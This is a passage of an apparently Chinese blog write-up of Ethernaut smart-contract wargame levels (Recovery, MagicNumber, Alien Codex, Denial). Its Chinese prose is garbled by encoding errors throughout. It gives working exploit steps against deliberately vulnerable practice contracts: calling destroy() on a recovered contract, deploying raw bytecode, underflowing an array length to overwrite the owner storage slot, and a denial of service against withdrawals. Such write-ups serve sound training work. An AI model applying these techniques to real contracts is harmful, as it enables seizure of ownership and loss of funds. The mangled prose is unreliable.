src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183155695.png" alt="image-20220303183155695"></p><p>å†é€šè¿‡äº¤æ˜“ä¿¡æ¯æ‰¾åˆ°ç”Ÿäº§åˆçº¦ <code>lost contract</code> çš„åœ°å€:0xfB481D6c4B732735Bc0345617e38a8f355DB9985</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183414425.png" alt="image-20220303183414425"></p><p>æ‹¿åˆ°ä¸¢å¤±çš„åˆçº¦åœ°å€ä»¥åï¼Œå»remixéƒ¨ç½² <code>SimpleToken</code> ï¼Œä½¿ç”¨ <code>At address</code> æŒ‡å®š <code>lost contract</code> çš„åœ°å€ï¼Œç„¶åæ‰§è¡Œ <code>destroy(play_address)</code> å³å¯</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183612735.png" alt="image-20220303183612735"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183726252.png" alt="image-20220303183726252"></p><p>æŸ¥çœ‹åˆçº¦åœ°å€ï¼Œå‘ç°å·²ç»è¢«é”€æ¯ï¼š<a href="https://rinkeby.etherscan.io/address/0xfb481d6c4b732735bc0345617e38a8f355db9985#internaltx">https://rinkeby.etherscan.io/address/0xfb481d6c4b732735bc0345617e38a8f355db9985#internaltx</a></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303185350095.png" alt="image-20220303185350095"></p><p>ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¡ç®—åœ°å€ã€‚</p><p>public a = addressï¼ˆkeccak256ï¼ˆ0xd6,0x94ï¼ŒYOUR_ADDRï¼Œ0x01ï¼‰ï¼‰;</p><p><a href="https://links.jianshu.com/go?to=https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3">å‚è€ƒé“¾æ¥</a></p><h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h2><h3 id="é—¯å…³è¦æ±‚-5"><a href="#é—¯å…³è¦æ±‚-5" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¦è§£å†³è¿™ä¸ªçº§åˆ«ï¼Œæ‚¨åªéœ€è¦å‘etranautæä¾›ä¸€ä¸ªâ€œSolverâ€ï¼Œè¿™æ˜¯ä¸€ä¸ªå“åº”â€œwhatistMeaningoflife()â€çš„å¥‘çº¦ï¼Œå¹¶æä¾›æ­£ç¡®çš„æ•°å­—ã€‚ å¾ˆå®¹æ˜“å§ï¼Ÿå¥½ã€‚ã€‚ã€‚æœ‰ä¸ªé™·é˜±ã€‚ è§£ç®—å™¨çš„ä»£ç éœ€è¦éå¸¸å°ã€‚çœŸçš„å¾ˆå°ã€‚å°±åƒæ€ªç‰©çœŸçš„æœ‰ç‚¹å°ï¼šæœ€å¤š10ä¸ªæ“ä½œç ã€‚ æç¤ºï¼šä¹Ÿè®¸æ˜¯æ—¶å€™æš‚æ—¶ç¦»å¼€Solidityç¼–è¯‘å™¨çš„èˆ’é€‚æ€§ï¼Œæ‰‹å·¥æ„å»ºè¿™ä¸ªç¼–è¯‘å™¨äº†ã€‚æ²¡é”™ï¼šåŸå§‹EVMå­—èŠ‚ç ã€‚ ç¥ä½ å¥½è¿ï¼<br>å³è¦æ±‚è¾“å‡º42(æ“ä½œç ä¸º2A)ã€‚</p><ul><li>é¢˜ç›®çš„æ„æ€å°±æ˜¯éƒ¨ç½²ä¸€ä¸ªåˆçº¦ <code>Solver</code> ï¼Œè¦æ±‚åœ¨è¢«è°ƒç”¨ <code>whatIsTheMeaningOfLife()</code> å‡½æ•°æ—¶è¿”å› <strong>42</strong> å°±å¯ä»¥äº†ï¼Œä½†æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯ä¸èƒ½è¶…è¿‡ <strong>10</strong> ä¸ª <code>opcode</code></li></ul><h3 id="åˆçº¦ä»£ç -5"><a href="#åˆçº¦ä»£ç -5" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract MagicNum &#123;<br><br>  address public solver;<br><br>  constructor() public &#123;&#125;<br><br>  function setSolver(address _solver) public &#123;<br>    solver = _solver;<br>  &#125;<br><br>  /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-5"><a href="#åˆçº¦åˆ†æ-5" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>åˆ›å»ºä¸€ä¸ªç®€å•çš„åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.11;<br>contract C &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>bytecode</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;linkReferences&quot;</span>: &#123;&#125;,<br><span class="hljs-attr">&quot;object&quot;</span>: <span class="hljs-string">&quot;6080604052348015600f57600080fd5b50603580601d6000396000f3006080604052600080fd00a165627a7a72305820eb3bb9eb1153de451fdb73f63dffc5c28f93dd665ad0b87028137bef976257500029&quot;</span>, <span class="hljs-comment">//å­—èŠ‚ç </span><br><span class="hljs-attr">&quot;opcodes&quot;</span>: <span class="hljs-string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x35 DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xeb EXTCODESIZE 0xb9 0xeb GT MSTORE8 0xde GASLIMIT 0x1f 0xdb PUSH20 0xF63DFFC5C28F93DD665AD0B87028137BEF976257 POP STOP 0x29 &quot;</span>,<br><span class="hljs-attr">&quot;sourceMap&quot;</span>: <span class="hljs-string">&quot;26:15:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;26:15:0;;;;;;;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å°†ä¸Šé¢çš„å­—èŠ‚ç åˆ†æˆ3ä¸ªç‹¬ç«‹çš„å—ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//éƒ¨ç½²ä»£ç </span><br><span class="hljs-number">60606040523415600e57600080</span>fd5b5b603680601c6000396000f300<br><span class="hljs-comment">//åˆçº¦ä»£ç </span><br><span class="hljs-number">60606040525b</span>600080fd00<br><span class="hljs-comment">// Auxdata</span><br>a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºåˆçº¦æ—¶è¿è¡Œéƒ¨ç½²ä»£ç </li><li>åˆçº¦åˆ›å»ºæˆåŠŸä¹‹åå½“å®ƒçš„æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¿è¡Œåˆçº¦ä»£ç </li><li>ï¼ˆå¯é€‰ï¼‰Auxdataæ˜¯æºç çš„åŠ å¯†æŒ‡çº¹ï¼Œç”¨æ¥éªŒè¯ã€‚è¿™åªæ˜¯æ•°æ®ï¼Œæ°¸è¿œä¸ä¼šè¢«EVMæ‰§è¡Œ</li></ul><p>éƒ¨ç½²ä»£ç æœ‰ä¸¤ä¸ªä¸»è¦ä½œç”¨ï¼š</p><ol><li>è¿è¡Œæ„é€ å™¨å‡½æ•°ï¼Œå¹¶è®¾ç½®åˆå§‹åŒ–å†…å­˜å˜é‡ï¼ˆå°±åƒåˆçº¦çš„æ‹¥æœ‰è€…ï¼‰</li><li>è®¡ç®—åˆçº¦ä»£ç ï¼Œå¹¶è¿”å›ç»™EVM</li></ol><p>Solidityç¼–è¯‘å™¨äº§ç”Ÿçš„éƒ¨ç½²ä»£ç ä¼šä»å­—èŠ‚ç ä¸­åŠ è½½<code>60606040525b600080fd00</code>åˆ°å†…å­˜ä¸­ï¼Œç„¶åå°†å®ƒä½œä¸ºåˆçº¦ä»£ç è¿”å›ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œâ€œè®¡ç®—â€åªæ˜¯è¯»å–ä¸€å—æ•°æ®åˆ°å†…å­˜ä¸­ã€‚åŸåˆ™ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç¼–ç¨‹åœ°äº§ç”Ÿåˆçº¦ä»£ç ã€‚</p><p>å¸¸ç”¨çš„æ±‡ç¼–æŒ‡ä»¤ï¼š</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220305163518304.png" alt="image-20220305163518304"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220305163557586.png" alt="image-20220305163557586"></p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs puppet">.code<br>  PUSH 80contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 40contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">MSTORE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">CALLVALUE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">olidity</span> ^<br>  ISZERO a <br>  PUSH [tag] 1a <br>  JUMPI a <br>  PUSH 0r<br>  DUP1 o<br>  REVERT .11;\r\ncontra<br>tag 1a <br>  JUMPDEST a <br>  POP contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> #[$] 0000000000000000000000000000000000000000000000000000000000000000contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> [$] 0000000000000000000000000000000000000000000000000000000000000000contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">CODECOPY</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>.data<br>  0:<br>    .code<br>      PUSH 80contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">PUSH</span> 40contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">MSTORE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">REVERT</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>    .data<br></code></pre></td></tr></table></figure><p>bytecodeç”±ä¸¤éƒ¨åˆ†æ„æˆã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†çš„.codeåŒ…å«äº†ä¸€äº›smart contractåˆå§‹åŒ–çš„ä»£ç ï¼Œæ¯”å¦‚æ„é€ å‡½æ•°ï¼Œstate variableï¼ˆå…¨å±€å˜é‡ï¼‰çš„èµ‹å€¼ç­‰æ“ä½œã€‚åŒºå—é“¾ä¸Šï¼Œè¿™äº›éƒ½æ˜¯EOAåœ¨éƒ¨ç½²åˆçº¦æ—¶å°±æ‰§è¡Œå®Œæˆçš„ã€‚</p><p>ä».dataå¼€å§‹ï¼Œæ˜¯smart contractçš„runtime bytecodeï¼Œä¹Ÿå°±æ˜¯åœ¨åŒºå—é“¾ä¸Šä¿å­˜çš„åˆçº¦çš„bytecodeã€‚ </p><p>codecopy(t, f, s)-F ä»ä»£ç çš„ä½ç½® f å¼€å§‹æ‹·è´ s ä¸ªå­—èŠ‚åˆ°å†…å­˜çš„ä½ç½® t</p><p><a href="https://blog.csdn.net/Programmer_CJC/article/details/80218649">å‚è€ƒ1</a></p><p><a href="https://paper.seebug.org/790/">å‚è€ƒ2</a></p><p><a href="https://www.jianshu.com/p/d9137e87c9d3">å‚è€ƒ3</a></p><h3 id="æ”»å‡»æµç¨‹-5"><a href="#æ”»å‡»æµç¨‹-5" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p><a href="https://hitcxy.com/2019/ethernaut/">å‚è€ƒ</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">bytecode = <span class="hljs-string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>;<br>web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>:player,<span class="hljs-attr">data</span>:bytecode&#125;)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°åˆçº¦<a href="https://rinkeby.etherscan.io/tx/0xb354513ca1442426057f5aa0f2404ff4578725d68eccf27a7cdf9535157e7086">https://rinkeby.etherscan.io/tx/0xb354513ca1442426057f5aa0f2404ff4578725d68eccf27a7cdf9535157e7086</a></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220306145644803.png" alt="image-20220306145644803"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.setSolver(<span class="hljs-string">&#x27;0x1373751D06eC2214c36C314C4e5Ed13b520830Ad&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220306145732582.png" alt="image-20220306145732582"></p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h2><h3 id="é—¯å…³è¦æ±‚-6"><a href="#é—¯å…³è¦æ±‚-6" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>ä½ æ‰“å¼€äº†ä¸€ä¸ª Alien åˆçº¦. ç”³æ˜æ‰€æœ‰æƒæ¥å®Œæˆè¿™ä¸€å…³.</p><h3 id="åˆçº¦ä»£ç -6"><a href="#åˆçº¦ä»£ç -6" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &#x27;../helpers/Ownable-05.sol&#x27;;<br><br>contract AlienCodex is Ownable &#123;<br><br>  bool public contact;<br>  bytes32[] public codex;<br><br>  modifier contacted() &#123;<br>    assert(contact);<br>    _;<br>  &#125;<br>  <br>  function make_contact() public &#123;<br>    contact = true;<br>  &#125;<br><br>  function record(bytes32 _content) contacted public &#123;<br>  codex.push(_content);<br>  &#125;<br><br>  function retract() contacted public &#123;<br>    codex.length--;<br>  &#125;<br><br>  function revise(uint i, bytes32 _content) contacted public &#123;<br>    codex[i] = _content;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-6"><a href="#åˆçº¦åˆ†æ-6" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><ul><li><p>åˆçº¦å¼€å¤´ <code>import</code> äº† <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol">Ownable.sol</a> åˆçº¦ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†ä¸€ä¸ª <strong>owner</strong> å˜é‡</p><p>ç”±äº EVM å­˜å‚¨ä¼˜åŒ–çš„å…³ç³»ï¼Œåœ¨ slot [0]ä¸­åŒæ—¶å­˜å‚¨äº†contactå’Œownerï¼Œéœ€è¦åšçš„å°±æ˜¯å°†ownerå˜é‡è¦†ç›–ä¸ºè‡ªå·±ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> web3.eth.getStorageAt(instance, <span class="hljs-number">0</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) </span>&#123;<span class="hljs-built_in">console</span>.info(y)&#125;);<br><span class="hljs-comment">// 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272 slot0</span><br><span class="hljs-comment">// å¯¹åº”çš„ contact ä¸ºé›¶,Owner=0xda5b3fb76c78b6edee6be8f11a1c31ecfb02b272</span><br></code></pre></td></tr></table></figure></li><li><p>æ•°ç»„ <strong>codex</strong> çš„ <code>slot</code> ä¸º <code>1</code> ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯å­˜å‚¨æ•°ç»„ <strong>length</strong> çš„åœ°æ–¹ï¼Œè€Œ <strong>codex</strong> çš„å®é™…å†…å®¹å­˜å‚¨åœ¨ <code>keccak256(bytes32(1))</code> å¼€å§‹çš„ä½ç½®</p><ul><li>å‚è€ƒ <a href="https://www.freebuf.com/articles/blockchain-articles/177260.html">Solidityä¸­å„ç§å˜é‡çš„å­˜å‚¨æ–¹å¼</a></li></ul></li><li><p>å› ä¸ºæ€»å…±æœ‰ <strong>2^256</strong> ä¸ª <code>slot</code> ï¼Œè¦ä¿®æ”¹ <strong>slot 0</strong> ï¼Œå‡è®¾ <strong>codex</strong> å®é™…æ‰€åœ¨ <code>slot x</code> ï¼Œ(å¯¹äºæœ¬é¢˜æ¥è¯´ï¼Œæ•°ç»„çš„ <code>slot</code>æ˜¯ <code>1</code> ï¼Œ x=keccak256(bytes32(1))) ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¿®æ”¹ <strong>codex[y],(y=2^256-x+0)</strong> æ—¶å°±èƒ½ä¿®æ”¹ <strong>slot 0</strong> ï¼Œä»è€Œä¿®æ”¹ <strong>owner</strong></p><ul><li><p>ç»™ä½äºæ•°ç»„ç›¸å¯¹çš„ä½ç½®èµ‹å€¼</p></li><li><p>æˆ‘ä»¬è¦ä¿®æ”¹ <strong>codex[y]</strong> ï¼Œé‚£å°±è¦æ»¡è¶³ <code>y &lt; codex.length</code> ï¼Œè€Œè¿™ä¸ªæ—¶å€™ <strong>codex.length =0</strong> ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>retract()</strong> ä½¿ <code>length</code> ä¸‹æº¢ï¼Œç„¶åå°±å¯ä»¥æ“çºµ <strong>codex[y]</strong> äº†</p></li></ul></li><li><p>è°ƒç”¨ä»»ä½•å‡½æ•°éƒ½éœ€è¦ç»•è¿‡ä¿®é¥°å…³é”®è¯contactedçš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä½¿contact = trueï¼Œé‚£å°±æ˜¯è°ƒç”¨make_contact() å‡½æ•°</p></li></ul><h3 id="æ”»å‡»æµç¨‹-6"><a href="#æ”»å‡»æµç¨‹-6" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p>å…ˆè°ƒç”¨ <code>make_contact</code> å‡½æ•°</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307215241130.png" alt="image-20220307215241130"></p></li><li><p>è®¡ç®—codex çš„ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract test &#123;<br>function go() view returns(bytes32)&#123;<br>   return keccak256((bytes32(1)));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307215852291.png" alt="image-20220307215852291"></p><p>å³ 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</p></li><li><p>y = 2^256-x+0 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</p></li><li><p>é€šè¿‡ <code>retract()</code> ä½¿å¾— <strong>codex</strong> æ•°ç»„ <code>length</code> ä¸‹æº¢ï¼Œä½¿å…¶æ»¡è¶³ <strong>y &lt; codex.length</strong></p></li><li><p>å°† <strong>owner</strong> æ¢æˆ <strong>player</strong> åœ°å€å³å¯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.owner()<br><span class="hljs-comment">// &quot;0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272&quot;</span><br>contract.revise(<span class="hljs-string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="hljs-string">&quot;0x0000000000000000000000019DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>)<br><span class="hljs-comment">// è°ƒç”¨ revise()</span><br><span class="hljs-keyword">await</span> contract.owner()<br><span class="hljs-comment">// &#x27;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307223654117.png" alt="image-20220307223654117"></p></li></ol><h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h2><h3 id="é—¯å…³è¦æ±‚-7"><a href="#é—¯å…³è¦æ±‚-7" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é’±åŒ…ï¼Œä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œæµå¤±èµ„é‡‘ã€‚æ‚¨å¯ä»¥æˆä¸ºææ¬¾ä¼™ä¼´ï¼Œæ…¢æ…¢ææ¬¾ã€‚</p><p>å¦‚æœæ‚¨å¯ä»¥åœ¨æ‰€æœ‰è€…è°ƒç”¨withdraw() æ—¶æ‹’ç»æå–èµ„é‡‘ï¼ˆè€Œåˆçº¦ä»æœ‰èµ„é‡‘ï¼Œå¹¶ä¸”äº¤æ˜“çš„gas ä¸º1M æˆ–æ›´å°‘ï¼‰ï¼Œæ‚¨å°†èµ¢å¾—æ­¤çº§åˆ«ã€‚</p><p>å³é€ æˆDOSä½¿å¾—åˆçº¦çš„owneråœ¨è°ƒç”¨withdrawæ—¶æ— æ³•æ­£å¸¸æå–èµ„äº§ã€‚</p><h3 id="åˆçº¦ä»£ç -7"><a href="#åˆçº¦ä»£ç -7" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Denial &#123;<br><br>    using SafeMath for uint256;<br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address payable public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance.div(100);<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        owner.transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = now;<br>        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-7"><a href="#åˆçº¦åˆ†æ-7" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><ul><li>å¯ä»¥ä½¿ <code>transfer</code> å¤±è´¥ï¼Œä¹Ÿå°±æ˜¯æŠŠ <code>gas</code> 